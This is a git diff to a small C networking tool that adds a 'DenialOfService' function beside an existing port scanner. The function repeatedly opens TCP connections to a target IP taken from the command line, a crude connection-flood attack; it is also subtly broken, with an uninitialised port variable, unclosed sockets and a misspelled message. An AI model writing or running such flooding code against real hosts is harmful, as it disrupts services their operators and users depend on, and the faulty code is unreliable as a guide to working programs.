@@ -4,6 +4,7 @@
 #include <netdb.h>//uses to work with socket.
 #include <arpa/inet.h> // uses to work with InetNtoa method;
 #include <sys/socket.h>// uses to work with socket.
+#include <unistd.h>// uses to close the socket.
 
 
 // Rosolves DNS.
@@ -43,5 +44,28 @@ void PortScan(int Argc, char *Argv[])
             close(mySocket);
             close(connectMySocket);
         }
+    }
+}
+
+// DOS to a target
+void DenialOfService(char *Argv[])
+{
+    int mySocket;
+    int connectMySocket;
+    char *destination = Argv[1];
+    int port;
+    
+    struct sockaddr_in targetSocket;
+
+    while (port != 0)
+    {
+        
+        mySocket = socket(AF_INET,SOCK_STREAM,0);
+        targetSocket.sin_family = AF_INET;
+        targetSocket.sin_port = htons(port);
+        targetSocket.sin_addr.s_addr = inet_addr(destination);
+        connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);
+        printf("The service is soffering DoS");
+
     }
 }
